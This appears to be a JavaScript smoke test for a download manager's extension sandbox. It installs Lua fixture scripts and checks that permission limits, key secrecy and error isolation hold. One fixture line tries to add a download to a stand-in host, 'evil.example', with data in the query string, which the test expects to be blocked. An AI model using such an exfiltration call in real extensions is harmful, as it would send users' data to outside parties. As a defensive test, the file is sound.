// The real desktop, scheduler, CLI and workers. Generated data, loopback server, private profile only.
const assert = require('node:assert/strict');
const fs = require('node:fs'), os = require('node:os'), path = require('node:path'), http = require('node:http');
const {createHash, createCipheriv} = require('node:crypto');
const {spawn} = require('node:child_process'), {once} = require('node:events');
const {setTimeout: delay} = require('node:timers/promises');
const openDatabase = require('./profile_database.cjs');
const root = path.resolve(__dirname, '..');
const binary = path.resolve(process.argv[2] || path.join(root, 'target/debug'));
const home = fs.mkdtempSync(path.join(os.tmpdir(), 'de-extension-smoke-'));
const env = {...process.env, IDM_EX_HOME: home, DOWNLOAD_ENGINE_HOME: home};
for (const key of Object.keys(env)) if (key.startsWith('IDM_EX_TEST_') || key.startsWith('IDM_EX_SCRIPT_') || key.includes('SCREENSHOT_TO')) delete env[key];

const ID = 'example.smoke';
const key = '603deb1015ca71be2b73aef0857d77811f352c073b6108d72d9810a30914dff4';
const counter = '000102030405060708090a0b0c0d0e0f';
const plain = Buffer.alloc(1024 * 1024 + 37);
for (let i = 0; i < plain.length; i++) plain[i] = (i * 17 + 9) % 251;
const cipher = createCipheriv('aes-256-ctr', Buffer.from(key, 'hex'), Buffer.from(counter, 'hex'));
const encrypted = Buffer.concat([cipher.update(plain), cipher.final()]);
const hash = (bytes) => createHash('sha256').update(bytes).digest('hex');

const server = http.createServer((req, res) => {
  const match = /^bytes=(\d+)-(\d*)$/.exec(req.headers.range || '');
  const start = match ? +match[1] : 0;
  const end = match && match[2] ? Math.min(+match[2], encrypted.length - 1) : encrypted.length - 1;
  const headers = {'Content-Type': 'application/octet-stream', 'Content-Length': end - start + 1, ETag: '"extension-fixture"', 'Accept-Ranges': 'bytes'};
  if (match) headers['Content-Range'] = `bytes ${start}-${end}/${encrypted.length}`;
  res.writeHead(match ? 206 : 200, headers);
  res.end(encrypted.subarray(start, end + 1));
});

const manifest = {
  format: 'download-engine-extension', format_version: 1, id: ID, name: 'Smoke', version: '1.0.0',
  publisher: 'Smoke test', description: 'Exercises the real scheduler and workers.', api_version: 1, provider_api: 1,
  permissions: {network: ['smoke.example']},
  settings: [
    {id: 'label', type: 'string', label: 'Label', default: 'unset'},
    {id: 'content_key', type: 'aes_key', label: 'Content key'},
  ],
  jobs: [
    {id: 'report', name: 'Report', entry: 'report.lua', timeout_seconds: 30, trigger: {kind: 'manual'}},
    {id: 'decrypt', name: 'Decrypt', entry: 'provider.lua', timeout_seconds: 30, trigger: {kind: 'provider'}},
    {id: 'leak', name: 'Leak', entry: 'leak.lua', timeout_seconds: 30, trigger: {kind: 'provider'}},
  ],
};
const files = {
  'lib/text.lua': `local M = {}\nfunction M.label() return 'label=' .. xd.setting('label') end\nreturn M\n`,
  'report.lua': [
    `local text = require('lib.text')`,
    `print(text.label())`,
    `print('job=' .. xd.extension.job)`,
    `print('undeclared add: ' .. tostring(pcall(xd.add, 'https://evil.example/?data=names')))`,
    `print('rule command: ' .. tostring(pcall(xd.command, 'automation', 'list')))`,
    `print('fetch: ' .. tostring(xd.supports('xd.fetch')))`,
    `print('key setting: ' .. tostring(pcall(xd.setting, 'content_key')))`,
  ].join('\n'),
  'provider.lua': [
    `local text = require('lib.text')`,
    `local key`,
    `if xd.phase == 'processor' then key = xd.key_setting('content_key') end`,
    `local function plan(request) return {`,
    `  url = request.url, size = ${encrypted.length}, input_sha256 = '${hash(encrypted)}',`,
    `  output_sha256 = '${hash(plain)}', transform_id = text.label(),`,
    `} end`,
    `return {`,
    `  resolve = plan, refresh = plan,`,
    `  transform = function(_, bytes, offset) return xd.aes_ctr(key, '${counter}', bytes, offset) end,`,
    `  finish = function() return true end,`,
    `}`,
  ].join('\n'),
  'leak.lua': [
    `local function plan(request) return {`,
    `  url = request.url, size = ${encrypted.length}, input_sha256 = '${hash(encrypted)}',`,
    `  output_sha256 = '${hash(plain)}', transform_id = 'leak',`,
    `} end`,
    `return {`,
    `  resolve = plan, refresh = plan,`,
    `  transform = function() error('leaked-file-bytes') end,`,
    `  finish = function() return true end,`,
    `}`,
  ].join('\n'),
};

let app, db, success = false;
const checks = [];
const mark = (name) => { checks.push(name); console.log(`ok: ${name}`); };
async function until(fn, label, ms = 45000) {
  const end = Date.now() + ms;
  while (Date.now() < end) { const value = await fn(); if (value) return value; await delay(60); }
  throw Error(`Timed out: ${label}`);
}
async function cli(args, expected = 0, input) {
  const child = spawn(path.join(binary, 'de-cli.exe'), [...args, '--no-start'], {env, windowsHide: true, stdio: [input === undefined ? 'ignore' : 'pipe', 'pipe', 'pipe']});
  if (input !== undefined) child.stdin.end(input);
  let stdout = '', stderr = '';
  child.stdout.on('data', (b) => { stdout += b; });
  child.stderr.on('data', (b) => { stderr += b; });
  const timer = setTimeout(() => child.kill(), 30000);
  try {
    const [code] = await once(child, 'exit');
    assert.equal(code, expected, `${args}\n${stdout}\n${stderr}`);
    const value = JSON.parse(stdout || stderr);
    return value.receipt ? value.receipt.result : value.result ?? value;
  } finally { clearTimeout(timer); }
}
async function launch() {
  const log = fs.openSync(path.join(home, 'desktop.log'), 'a');
  try { app = spawn(path.join(binary, 'de.exe'), [], {env, windowsHide: true, stdio: ['ignore', log, log]}); } finally { fs.closeSync(log); }
  const pid = app.pid;
  await until(() => {
    assert(app.exitCode === null && app.signalCode === null, 'Desktop exited');
    const file = path.join(home, 'data/logs/desktop.log');
    return fs.existsSync(file) && fs.readFileSync(file, 'utf8').split(/\r?\n/).filter(Boolean).some((line) => {
      try { const entry = JSON.parse(line); return entry.pid === pid && entry.event === 'ready'; } catch { return false; }
    });
  }, 'desktop ready');
}
async function stop() {
  if (app && app.exitCode === null && app.signalCode === null) { const exited = once(app, 'exit'); app.kill(); await exited; }
  app = null;
}

async function main() {
  server.listen(0, '127.0.0.1');
  await once(server, 'listening');
  const url = `http://127.0.0.1:${server.address().port}/sample.bin`;
  await cli(['queues']);
  db = openDatabase(path.join(home, 'data/queue.sqlite3'));
  db.exec('UPDATE desktop_preferences SET close_to_tray=0,notify_complete=0,notify_failed=0');
  db.exec("UPDATE interface_preferences SET data=json_set(data,'$.check_updates_on_launch',json('false')) WHERE id=1");
  db.prepare('UPDATE proxy_settings SET data=? WHERE id=1').run(JSON.stringify({mode: 'direct'}));

  const folder = path.join(home, 'source');
  fs.mkdirSync(path.join(folder, 'lib'), {recursive: true});
  fs.writeFileSync(path.join(folder, 'manifest.json'), JSON.stringify(manifest));
  for (const [file, source] of Object.entries(files)) fs.writeFileSync(path.join(folder, file), source);
  const packed = path.join(home, 'smoke.de-extension.json');
  await cli(['extensions', 'pack', folder, '--out', packed]);
  await cli(['extensions', 'install', packed]);
  await cli(['extensions', 'set', ID, 'label', 'from-settings']);
  await cli(['extensions', 'set-secret', ID, 'content_key'], 0, key);
  mark('A folder packs, installs from the CLI, and takes a setting and a key from redirected stdin');
  assert(!fs.readFileSync(path.join(home, 'data/queue.sqlite3')).includes(Buffer.from(key)), 'The key must not be stored in plain text');

  await launch();
  const shown = await cli(['extensions', 'show', ID]);
  const job = (name) => shown.jobs.find((item) => item.id === name).script_id;
  assert.equal(shown.extension.enabled, false);
  await cli(['scripts', 'run', job('report')], 1);
  mark('A job cannot run while its extension is turned off');
  await cli(['extensions', 'enable', ID]);

  const run = await cli(['scripts', 'run', job('report')]);
  const finished = await until(async () => {
    const runs = await cli(['scripts', 'runs', job('report')]);
    const current = runs.find((item) => item.id === run.id);
    return !['queued', 'running'].includes(current.state) && current;
  }, 'report run');
  const log = (await cli(['scripts', 'logs', run.id])).map((line) => line.text).join('');
  assert.equal(finished.state, 'succeeded', log);
  assert.match(log, /label=from-settings/);
  assert.match(log, /job=report/);
  assert.match(log, /undeclared add: false/);
  assert.match(log, /rule command: false/);
  assert.match(log, /fetch: false/);
  assert.match(log, /key setting: false/);
  assert(!log.includes(key));
  assert.equal(db.prepare('SELECT count(*) n FROM jobs').get().n, 0);
  mark('The real scheduler ran a job with its modules and settings, and every limit held');

  const added = await cli(['scripts', 'download', job('decrypt'), url, '--name', 'plain.bin']);
  const complete = await until(() => {
    const item = JSON.parse(db.prepare('SELECT data FROM jobs WHERE id=?').get(added.id).data);
    if (item.status === 'failed') throw Error(item.error);
    return item.status === 'complete' && item;
  }, 'provider download');
  assert.equal(hash(fs.readFileSync(complete.saved_path)), hash(plain));
  mark('A provider extension downloaded, decrypted with its saved key and published the exact file');

  const leaked = await cli(['scripts', 'download', job('leak'), url, '--name', 'leak.bin']);
  const failing = await until(() => {
    const item = JSON.parse(db.prepare('SELECT data FROM jobs WHERE id=?').get(leaked.id).data);
    return item.error && item;
  }, 'failing processor');
  assert.match(failing.error, /processor failed/);
  assert(!failing.error.includes('leaked-file-bytes'), failing.error);
  await cli(['remove', leaked.id]);
  mark("A processor's error text never reaches the download, where other jobs could read it");

  await cli(['extensions', 'disable', ID]);
  await cli(['scripts', 'download', job('decrypt'), url, '--name', 'off.bin'], 1);
  mark('A turned-off extension cannot start a download');

  await cli(['extensions', 'remove', ID]);
  assert.deepEqual(await cli(['extensions', 'list']), []);
  mark('Removing the extension clears it once its downloads are finished');
  success = true;
}

main().catch((error) => { console.error(error); process.exitCode = 1; }).finally(async () => {
  await stop().catch(() => {});
  server.close();
  if (db) db.close();
  if (success) { fs.rmSync(home, {recursive: true, force: true, maxRetries: 20, retryDelay: 100}); console.log(`${checks.length} checks passed`); }
  else console.error(`Left for inspection: ${home}`);
});
